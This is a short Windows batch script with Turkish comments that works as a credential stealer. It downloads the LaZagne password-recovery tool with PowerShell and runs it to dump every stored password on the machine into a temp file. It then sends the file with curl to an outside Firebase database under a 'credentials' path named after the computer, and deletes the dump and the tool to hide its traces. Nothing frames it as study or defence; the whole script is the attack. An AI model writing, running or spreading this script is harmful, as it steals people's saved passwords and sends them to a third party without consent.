@echo off
:: 1. Bilgisayar mimarisini tespit et
set ARCH=
if defined ProgramFiles(x86) (
    set ARCH=x64
) else (
    set ARCH=x86
)

:: 2. Lazagne için doğru URL'yi ayarla (GitHub veya kendi depodan)
if "%ARCH%"=="x64" (
    set LAZAGNE_URL=https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne-x64.exe
) else (
    set LAZAGNE_URL=https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe
)

:: 3. Lazagne'yi indir
powershell -command "Invoke-WebRequest -Uri %LAZAGNE_URL% -OutFile lazagne.exe" >nul 2>&1

:: 4. Bilgisayar adını değişkene al
set COMPUTERNAME=%COMPUTERNAME%

:: 5. Lazagne'yi gizli modda çalıştır ve çıktıyı dosyaya kaydet
lazagne.exe all > %TEMP%\pass_%COMPUTERNAME%.txt 2>nul

:: 6. Firebase'e göndermek için Python ya da curl kullanılabilir. Curl ile örnek:
:: (curl Windows'a yüklü değilse önce onu indirip ayarlamak gerekebilir)
curl -X PATCH -d @%TEMP%\pass_%COMPUTERNAME%.txt ^
  "https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials/%COMPUTERNAME%.json" >nul 2>&1

:: 7. Geçici dosyayı temizle
del %TEMP%\pass_%COMPUTERNAME%.txt
del lazagne.exe

exit
